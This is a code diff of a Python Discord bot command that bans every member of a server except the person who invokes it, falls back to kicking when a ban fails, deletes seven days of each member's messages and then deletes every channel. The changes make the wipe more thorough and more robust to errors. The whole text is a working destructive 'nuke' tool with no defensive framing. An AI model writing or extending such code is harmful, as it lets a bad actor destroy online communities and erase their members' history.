@@ -23,29 +23,41 @@ async def cya(ctx):
 
     #  banning everyone
 
-    print("[CYA] Ban started.")
+    print("User wipe started.")
     for member in list(server.members):
         if member == author:
-            print("[CYA] Not banning [{}]".format(author))  # makes the bot not ban whoever uses command
+            print("Not banning initiator.")  # makes the bot not ban whoever uses command
         else:
-            print("[CYA] Banning member [{}]".format(member))
-
             # in-case you cant ban someone due to perms, roles, etc.
             try:
                 await client.ban(member, delete_message_days=7)
-            except:
-                pass
-    print("[CYA] Done banning.")
+                banint += 1
+                print("Banned member count: {}.".format(banint))
+            except Exception as e:
+                print(e)
+                try:
+                    await client.kick(member)   # tries to kick if no perms to ban
+                    kickint += 1
+                    print("Kicked member count: {}.".format(kickint))
+                except Exception as e:
+                    print(e)
+                    pass
+    print("Done wiping.")
 
     #  deleting channels
 
-    print("[CYA] Mass deletion started.")
+    print("Mass channel deletion started.")
+
     for channel in list(server.channels):
-        print("[CYA] Deleting {} channel [{}]".format(channel.type, channel.name))
-        await client.delete_channel(channel)
+        try:
+            await client.delete_channel(channel)
+            print("Deleting channel [{}]".format(channel.name))
+        except Exception as e:
+            print(e)
+            pass
 
-    print("[CYA] Done deleting.")
+    print("Done deleting.")
 
-    print("[CYA] Finished [CYA] protocol.")
+    print("Finished.")
 
 client.run(token)
